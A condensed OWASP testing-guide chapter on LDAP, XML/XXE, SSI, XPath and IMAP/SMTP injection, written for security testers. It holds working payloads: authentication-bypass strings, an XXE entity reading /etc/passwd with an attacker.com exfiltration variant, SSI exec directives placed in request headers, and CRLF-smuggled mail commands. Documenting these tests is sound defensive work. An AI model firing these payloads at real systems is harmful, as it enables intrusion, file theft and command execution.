# WSTG INPV — LDAP, XML, SSI, XPath & Mail Injection

OWASP WSTG v4.2. Input Validation subset. Tests WSTG-INPV-06, 07, 08, 09, 10.

## Table of Contents

- [INPV-06 LDAP Injection](#wstg-inpv-06)
- [INPV-07 XML Injection](#wstg-inpv-07)
- [INPV-08 SSI Injection](#wstg-inpv-08)
- [INPV-09 XPath Injection](#wstg-inpv-09)
- [INPV-10 IMAP/SMTP Injection](#wstg-inpv-10)

---

## WSTG-INPV-06

**Testing for LDAP Injection**

Goal: inject LDAP search-filter metacharacters into a query the app builds from user input, to disclose/modify directory data or bypass auth.

LDAPv3 search filters use prefix (Polish) notation: `find("cn=John & userPassword=mypass")` becomes `(&(cn=John)(userPassword=mypass))`.

| Metachar | Meaning |
|---|---|
| `&` | AND |
| `\|` | OR |
| `!` | NOT |
| `=` | equals |
| `~=` | approx |
| `>=` / `<=` | greater/less than |
| `*` | any character |
| `()` | grouping |

Black-box:

**Search filter probing** — `searchfilter="(cn="+user+")"` built from `?user=John`. Submitting `?user=*` yields `(cn=*)`, matching every object — confirms injection and dumps whatever attributes the connected LDAP account can read.

**Auth bypass** — a filter like:
```
searchlogin = "(&(uid="+user+")(userpassword={md5}"+base64(md5(pass))+"))"
```
with `user=*)(uid=*))(|(uid=*` and `pass=password` becomes:
```
(&(uid=*)(uid=*))(|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))
```
— an always-true filter that logs the tester in as the first entry in the LDAP tree.

Tools: Softerra LDAP Browser.

Refs: OWASP LDAP Injection Prevention Cheat Sheet; RFC 1960/2254 (LDAP search filter grammar); Sacha Faust, *LDAP Injection: Are Your Applications Vulnerable?*

---

## WSTG-INPV-07

**Testing for XML Injection**

Goal: break an XML parser's contextual validation by injecting XML metacharacters, then (once structure is known) inject full tags for privilege escalation or data disclosure.

**Discovery** — inject metacharacters one at a time into a field that lands inside an XML doc and watch for parse errors:

| Metachar | Effect when injected |
|---|---|
| `'` or `"` | breaks a quoted attribute value → malformed doc |
| `<` / `>` | breaks tag structure |
| `<!--` | opens an unterminated comment |
| `&foo` (unencoded `&`) | undefined/unterminated entity reference |
| `]]>` inside a `CDATA` block | closes the block early, allowing raw markup through |

**CDATA-driven XSS**: if the app strips `CDATA` delimiters without inspecting their contents before rendering as HTML, wrap a script payload in delimiters to smuggle it past sanitization:
```
$HTMLCode = <![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>
```
renders as `<script>alert('XSS')</script>` once delimiters are stripped.

**XXE (external entities)** — if the parser resolves externally defined entities, it will fetch arbitrary local/remote resources:
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```
Swap the `SYSTEM` URI for `file:///dev/random` (can crash a Unix host), `file:///c:/boot.ini`, or `http://attacker.com/text.txt` (SSRF / exfil).

**Tag injection** — once the doc structure is known, inject full closing/opening tags into a field to append attacker-controlled sibling nodes, e.g. terminating an `<mail>` field early and appending `<userid>0</userid>` to escalate a new user to admin ID `0`. If a DTD enforces node cardinality (e.g. exactly one `<userid>`), comment out the original with `<!-- ... -->` to keep the doc schema-valid while only the injected node survives.

Gray-box: audit XML parser configuration — check `DocumentBuilderFactory`/`SAXParserFactory`/`XMLInputFactory` (Java), `libxml2`/`libxerces-c` (C/C++) for external DTD/entity resolution left enabled. Also check Apache POI < 3.10.1 (XXE via `poi-*.jar`).

Tools: wfuzz XML injection payload list.

Refs: OWASP XXE Prevention Cheat Sheet; Gregory Steuck, *XXE (Xml eXternal Entity) attack*.

---

## WSTG-INPV-08

**Testing for SSI Injection**

Goal: inject Server-Side Include directives into input the server later parses inline in HTML — can lead to file disclosure or, if `exec` is enabled, remote command execution.

Requires the web server to have SSI enabled (check config for SSI keywords, or look for `.shtml` pages — absence doesn't rule it out).

Confirm the injectable character set survives input validation: `<!#=/."-> ` and `[a-zA-Z0-9]`. Directives to test:

| Directive | Effect |
|---|---|
| `<!--#echo var="VAR" -->` | prints a server variable |
| `<!--#include virtual="FILENAME" -->` | includes file content, a directory listing, or a CGI script's output |
| `<!--#exec cmd="OS_COMMAND" -->` | runs an OS command, returns output |

Test both body params and headers, since some apps build dynamic pages from header values:
```
Referer: <!--#exec cmd="/bin/ps ax"-->
User-Agent: <!--#include virtual="/proc/version"-->
```

Tools: Burp Suite, OWASP ZAP, grep.

Refs: Apache `mod_include`; IIS SSI directives; *SSI Injection instead of JavaScript Malware*.

---

## WSTG-INPV-09

**Testing for XPath Injection**

Goal: inject XPath syntax into a query built from user input against an XML data store — conceptually identical to SQL injection, but with no ACL layer, so a successful query can read the entire document.

Example XML "database" and login query:
```xml
<users>
<user><username>gandalf</username><password>!c3</password><account>admin</account></user>
<user><username>tony</username><password>Un6R34kb!e</password><account>guest</account></user>
</users>
```
```
string(//user[username/text()='gandalf' and password/text()='!c3']/account/text())
```
Injecting `' or '1' = '1` into both username and password fields produces an always-true predicate:
```
string(//user[username/text()='' or '1' = '1' and password/text()='' or '1' = '1']/account/text())
```
authenticating without valid credentials. As with SQL injection, start with a single `'` to trigger a parse error and confirm the injection point. Without a useful error message, fall back to Blind XPath Injection — infer the document structure one bit at a time via boolean queries.

Refs: Amit Klein, *Blind XPath Injection* (original XPath injection technique paper); XPath 1.0 spec.

---

## WSTG-INPV-10

**Testing for IMAP SMTP Injection**

Goal: inject arbitrary IMAP/SMTP commands via unsanitized webmail input, reaching a mail backend that's often less hardened than the front end because it's not meant to be internet-facing.

Possible impact: protocol-level exploitation, filter/anti-automation bypass, info leak, open relay/spam.

**Identify vulnerable params** — fuzz every request param feeding IMAP/SMTP operations (mailbox select, message fetch, auth, send) with:

| Test case | Example |
|---|---|
| Null value | `?mailbox=&passed_id=46106` |
| Random/nonexistent value | `?mailbox=NOTEXIST&passed_id=46106` |
| Extra value | `?mailbox=INBOX PARAMETER2&passed_id=46106` |
| Special chars (`\ ' " @ # ! \|`) | `?mailbox=INBOX%22&passed_id=46106` |
| Param removed entirely | `?passed_id=46106` (drop `mailbox`) |

Three outcomes: **S1** app returns an error/message, **S2** silent failure (no error, op not performed), **S3** silent success (op performed normally). S1 and S2 both indicate the input reached the backend unsanitized — S1 is most useful since the error text often echoes the underlying command:
```
ERROR: Bad or malformed request.
Query: SELECT "INBOX""
Server responded: Unexpected extra arguments to Select
```

**Map the data flow** — feed an unexpected type (e.g. alphabetic where numeric is expected) to see the raw command reconstructed in the error:
```
ERROR: Bad or malformed request.
Query: FETCH test:test BODY[HEADER]
```
No descriptive error → infer the likely command from the affected feature (e.g. a create-mailbox feature almost certainly maps to IMAP `CREATE`, which per RFC takes one param).

**Command injection** — once the surrounding command is known, inject a header/body/footer structure terminated with CRLF (`%0d%0a`) to smuggle a new command:
```
http://<webmail>/read_email.php?message_id=4791 BODY[HEADER]%0d%0aV100 CAPABILITY%0d%0aV101 FETCH 4791
```
yields three executed commands where only one was expected. Unauthenticated injection is limited to pre-auth commands (`CAPABILITY`, `NOOP`, `AUTHENTICATE`, `LOGIN`, `LOGOUT`); anything else requires the exploit to run post-auth.

Refs: RFC 0821 (SMTP); RFC 3501 (IMAP4rev1); Vicente Aguilera Díaz, *MX Injection: Capturing and Exploiting Hidden Mail Servers*.
